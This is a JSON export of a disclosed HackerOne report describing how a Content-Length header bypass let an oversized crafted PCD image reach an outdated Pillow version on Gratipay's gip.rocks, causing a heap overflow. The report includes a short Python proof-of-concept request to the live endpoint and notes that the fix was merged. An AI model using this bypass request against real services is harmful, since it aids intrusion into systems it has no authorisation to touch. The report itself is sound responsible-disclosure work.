{"id":214449,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ0NDk=","url":"https://hackerone.com/reports/214449","title":"Content-Length restriction bypass to heap overflow in gip.rocks.","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-03-18T12:27:50.003Z","submitted_at":"2017-03-18T12:27:50.003Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"edoverflow","url":"/edoverflow","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1868,"url":"https://hackerone.com/gratipay","handle":"gratipay","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Gratipay","twitter_handle":"Gratipay","website":"https://gratipay.com/","about":"Gratitude? Gratipay! The easiest way for your company to pay for open source."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-20T20:17:36.903Z","bug_reporter_agreed_on_going_public_at":"2017-03-20T20:12:38.550Z","team_member_agreed_on_going_public_at":"2017-03-20T20:17:36.862Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I started playing around with a0xnirudh's [Content-Length restriction bypass](https://hackerone.com/reports/203388) and noticed that when combined with a different vulnerability  this could be leveraged to do a bit more than DoS.\n\nWe decided to open a new ticket to address this issue, since [we were already aware of the bypass](https://github.com/gratipay/gip.rocks/issues/2). a0xnirudh wrote such a good report that we decided to not close their report as a `Duplicate`.\n\n# Summary\n---\n\nI noticed that `gip.rocks` was using an outdated version (2.9.0) of the Pillow framework which is vulnerable to heap overflows. The test playoad is 788480 bytes. So the bypass allowed me to pass the payload on to the vulnerable code.\n\n~~~python\n\u003e\u003e\u003e import os\n\u003e\u003e\u003e os.path.getsize('payload.pcd')\n788480L\n~~~\n\n# PoC\n---\n\nVulnerable code in `www/v1.st` summarised:\n\n~~~python\n\u003e\u003e\u003e from PIL import Image\n\u003e\u003e\u003e image = Image.open('foo.jpg')\n\u003e\u003e\u003e image.resize((foo, bar))\n~~~\n\nSummarised exploit:\n\n~~~python\n\u003e\u003e\u003e from PIL import Image\n\u003e\u003e\u003e image = Image.open('payload.pcd')\n\u003e\u003e\u003e image.resize((128, 128))\n~~~\n\nExploit concept:\n\n~~~python\nimport requests\nr = requests.post(  'http://gip.rocks/v1', \n                    data = open('payload.pcd').read(), \n                    headers = { \n                        'Content-Type': 'image/jpeg',\n                        'Content-Length': ' ' # Insert a value smaller than 262144\n                    }\n                  )\nprint(r.status_code, r.reason)\n~~~\n\n# Fix\n---\n\nI have submitted a PR to solve the heap overflow vulnerability: https://github.com/gratipay/gip.rocks/pull/5","vulnerability_information_html":"\u003cp\u003eI started playing around with a0xnirudh\u0026#39;s \u003ca href=\"https://hackerone.com/reports/203388\"\u003eContent-Length restriction bypass\u003c/a\u003e and noticed that when combined with a different vulnerability  this could be leveraged to do a bit more than DoS.\u003c/p\u003e\n\n\u003cp\u003eWe decided to open a new ticket to address this issue, since \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Fgip.rocks%2Fissues%2F2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewe were already aware of the bypass\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. a0xnirudh wrote such a good report that we decided to not close their report as a \u003ccode\u003eDuplicate\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"summary\"\u003eSummary\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eI noticed that \u003ccode\u003egip.rocks\u003c/code\u003e was using an outdated version (2.9.0) of the Pillow framework which is vulnerable to heap overflows. The test playoad is 788480 bytes. So the bypass allowed me to pass the payload on to the vulnerable code.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003eos\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003egetsize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;payload.pcd\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"il\"\u003e788480L\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"poc\"\u003ePoC\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eVulnerable code in \u003ccode\u003ewww/v1.st\u003c/code\u003e summarised:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003ePIL\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eImage\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eimage\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eImage\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;foo.jpg\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eimage\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eresize\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"n\"\u003efoo\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebar\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSummarised exploit:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003ePIL\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eImage\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eimage\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eImage\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;payload.pcd\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eimage\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eresize\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eExploit concept:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e  \u003cspan class=\"s\"\u003e\u0026#39;http://gip.rocks/v1\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \n                    \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;payload.pcd\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e \n                    \u003cspan class=\"n\"\u003eheaders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \n                        \u003cspan class=\"s\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;image/jpeg\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                        \u003cspan class=\"s\"\u003e\u0026#39;Content-Length\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Insert a value smaller than 262144\n\u003c/span\u003e                    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n                  \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estatus_code\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereason\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"fix\"\u003eFix\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eI have submitted a PR to solve the heap overflow vulnerability: \u003ca title=\"https://github.com/gratipay/gip.rocks/pull/5\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Fgip.rocks%2Fpull%2F5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/gratipay/gip.rocks/pull/5\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","weakness":{"id":5,"name":"Heap Overflow"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-19T20:12:38.589Z","allow_singular_disclosure_after":-116585119.10211793,"singular_disclosure_allowed":true,"vote_count":5,"voters":["delimitry","eveeez","hacklad","spetr0x","clarckowen_"],"severity":{"rating":"high","score":7.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"high","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1549610,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.\n\nPlease expect additional feedback from us within the next couple of days. The \"INFORMATION SECURITY\" section of the following page has additional, useful information regarding our platform's security: http://inside.gratipay.com/howto/manage-risk\n\nWe appreciate your interest in securing our platform and look forward to working with you.\n\nYours sincerely,\nThe Gratipay Security Team","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.\u003c/p\u003e\n\n\u003cp\u003ePlease expect additional feedback from us within the next couple of days. The \u0026quot;INFORMATION SECURITY\u0026quot; section of the following page has additional, useful information regarding our platform\u0026#39;s security: \u003ca title=\"http://inside.gratipay.com/howto/manage-risk\" href=\"/redirect?url=http%3A%2F%2Finside.gratipay.com%2Fhowto%2Fmanage-risk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://inside.gratipay.com/howto/manage-risk\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe appreciate your interest in securing our platform and look forward to working with you.\u003c/p\u003e\n\n\u003cp\u003eYours sincerely,\u003cbr\u003e\nThe Gratipay Security Team\u003c/p\u003e\n","automated_response":true,"created_at":"2017-03-18T12:27:50.162Z","updated_at":"2017-03-18T12:27:50.162Z","actor":{"url":"/gratipay","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/868/a75c6649c5b4671b3cf44160af884a7da9fd0b67_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Gratipay"}},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1549612,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-18T12:28:26.871Z","updated_at":"2017-03-18T12:28:26.871Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1553126,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"The PR has been merged and deployed: https://github.com/gratipay/gip.rocks/pull/5","markdown_message":"\u003cp\u003eThe PR has been merged and deployed: \u003ca title=\"https://github.com/gratipay/gip.rocks/pull/5\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgratipay%2Fgip.rocks%2Fpull%2F5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/gratipay/gip.rocks/pull/5\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-20T20:12:15.311Z","updated_at":"2017-03-20T20:12:15.311Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"edoverflow","url":"/edoverflow"},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1553128,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-20T20:12:38.570Z","updated_at":"2017-03-20T20:12:38.570Z","first_to_agree":true,"actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1553142,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-20T20:17:36.882Z","updated_at":"2017-03-20T20:17:36.882Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1553143,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-20T20:17:36.922Z","updated_at":"2017-03-20T20:17:36.922Z","actor":{"username":"whit537","cleared":false,"url":"/whit537","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/034/094/b38b9225fd8592d05d5e6939116e8f30d7c98af5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gratipay","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}